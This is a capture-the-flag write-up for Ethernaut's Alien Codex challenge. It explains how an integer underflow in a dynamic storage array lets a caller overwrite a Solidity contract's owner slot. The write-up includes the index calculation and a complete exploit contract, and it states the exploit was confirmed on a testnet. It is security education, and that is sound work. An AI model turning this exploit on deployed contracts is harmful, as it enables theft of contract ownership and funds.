# Ethernaut Level 19: Alien Codex

## Challenge
Claim ownership of the contract.

## Vulnerability
Dynamic arrays in storage + integer underflow = complete storage takeover.

## Storage Layout Analysis

```
slot 0: owner (20 bytes) + contact (bool, packed)
slot 1: codex.length
slot keccak256(1): codex[0] (array data starts here)
slot keccak256(1) + n: codex[n]
```

## The Attack Vector

1. **Make contact** → `makeContact()` sets `contact = true`
2. **Trigger underflow** → `retract()` when `codex.length = 0` causes underflow to `2^256 - 1`
3. **Calculate magic index** → Find which array index maps to slot 0
4. **Overwrite owner** → `revise(index, ourAddress)` writes to slot 0

## Index Calculation

Array data starts at `keccak256(1)`. To access slot 0:
```solidity
// i such that: keccak256(1) + i ≡ 0 (mod 2^256)
// i = 2^256 - keccak256(1)
uint index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1))));
```

## Exploit Contract

```solidity
contract AlienCodexExploit {
    AlienCodex public target;
    
    constructor(address _target) {
        target = AlienCodex(_target);
    }
    
    function attack() external {
        target.makeContact();
        target.retract(); // Underflow: length = 2^256 - 1
        
        uint index = uint256(0) - uint256(keccak256(abi.encodePacked(uint256(1))));
        bytes32 ourAddress = bytes32(uint256(uint160(msg.sender)));
        target.revise(index, ourAddress);
    }
}
```

## Lessons Learned

- **Array length underflows are catastrophic** (pre-Solidity 0.8)
- **Dynamic arrays can access any storage slot** with the right index
- **Storage is a predictable key-value store** — array indices map directly to storage slots
- **Solidity 0.8+ prevents this** with built-in overflow checks
- **`unchecked` blocks are dangerous** — they disable these protections

## Status
✅ **Validated** — Exploit confirmed working on testnet
